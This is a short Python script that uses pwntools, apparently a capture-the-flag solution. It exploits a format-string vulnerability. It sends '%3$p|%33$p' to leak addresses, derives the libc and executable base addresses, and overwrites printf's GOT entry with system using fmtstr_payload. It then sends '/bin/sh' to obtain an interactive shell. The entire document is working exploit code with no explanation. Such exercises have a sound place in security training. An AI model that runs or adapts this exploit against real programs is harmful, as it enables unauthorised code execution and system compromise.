r = conn()

r.sendline(b"%3$p|%33$p")
r.recvline()
leaks = r.recvline(False).split(b"|")
libc.address = int(leaks[0], 16) - libc.sym.read-18
exe.address = int(leaks[1],16) - exe.sym.__libc_csu_init-77

r.sendline(fmtstr_payload(6, {exe.got.printf:libc.sym.system}))
r.sendline(b"/bin/sh")

r.interactive()
